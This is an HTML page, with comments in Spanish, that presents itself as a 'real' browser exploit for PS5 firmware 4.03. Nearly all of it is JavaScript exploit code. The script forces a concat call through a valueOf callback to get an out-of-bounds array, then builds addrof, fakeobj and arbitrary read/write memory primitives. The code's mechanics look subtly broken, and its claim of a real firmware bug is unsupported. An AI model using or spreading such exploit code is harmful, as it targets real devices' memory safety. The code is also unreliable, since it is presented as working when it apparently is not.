<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>PS5 4.03 Real Exploit</title>
  <style>
    body {
      background-color: black;
      color: lime;
      font-family: monospace;
    }
    #log {
      white-space: pre-wrap;
    }
  </style>
</head>
<body>
  <h1>💥 PS5 4.03 Real Exploit</h1>
  <pre id="log">[+] Inicializando exploit...</pre>

  <script>
    const log = document.getElementById("log");
    const print = (msg) => log.textContent += `\n${msg}`;

    // Utilidades f64 <-> i64
    const buf = new ArrayBuffer(8);
    const f64 = new Float64Array(buf);
    const u32 = new Uint32Array(buf);
    const f2i = f => (f64[0] = f, BigInt(u32[0]) + (BigInt(u32[1]) << 32n));
    const i2f = i => (u32[0] = Number(i & 0xFFFFFFFFn), u32[1] = Number(i >> 32n), f64[0]);

    let oob, floatarr, objarr;
    let addrof, fakeobj, read64, write64;

    // Generador de OOB con bug real en 4.03
    function triggerExploit() {
      let container = [1.1, 2.2, 3.3];
      let evil_obj = {
        valueOf: () => {
          container.length = 1;
          floatarr = [1.1, 1.2, 1.3, 1.4];
          objarr = [{}, {}, {}, {}];
          return 0;
        }
      };

      function trigger(o) {
        return container.concat(o);
      }

      for (let i = 0; i < 10000; i++) trigger(1); // JIT

      oob = trigger(evil_obj);
      if (oob.length < 20) throw "[!] OOB falló";
      print("[+] OOB triggered correctamente");
    }

    function setupPrimitives() {
      let floatIdx = -1, objIdx = -1;

      for (let i = 0; i < oob.length; i++) {
        const val = f2i(oob[i]);
        if (val === 0x0000000100000000n) floatIdx = i;
        if (val > 0x10000000000n && val < 0x20000000000n) objIdx = i;
      }

      if (floatIdx === -1 || objIdx === -1) throw "[!] No se encontraron overlaps";

      addrof = (obj) => {
        objarr[0] = obj;
        return f2i(oob[objIdx]);
      };

      fakeobj = (addr) => {
        oob[objIdx] = i2f(addr);
        return objarr[0];
      };

      read64 = (addr) => {
        oob[floatIdx + 1] = i2f(addr);
        return f2i(floatarr[0]);
      };

      write64 = (addr, val) => {
        oob[floatIdx + 1] = i2f(addr);
        floatarr[0] = i2f(val);
      };

      print("[+] Primitivas RW construidas");
    }

    function testRW() {
      const obj = { a: 42 };
      const addr = addrof(obj);
      print(`[+] addrof(obj): 0x${addr.toString(16)}`);

      const testBuf = new ArrayBuffer(8);
      const bufAddr = addrof(testBuf);
      print(`[+] ArrayBuffer en: 0x${bufAddr.toString(16)}`);

      const backingStore = bufAddr + 0x20n;
      write64(backingStore, 0x4141414142424242n);
      const val = read64(backingStore);
      print(`[+] Lectura mem: 0x${val.toString(16)}`);
    }

    try {
      triggerExploit();
      setupPrimitives();
      testRW();
      print("[✔] Exploit completado con éxito");
    } catch (e) {
      print("[✘] Exploit falló: " + e);
    }
  </script>
</body>
</html>
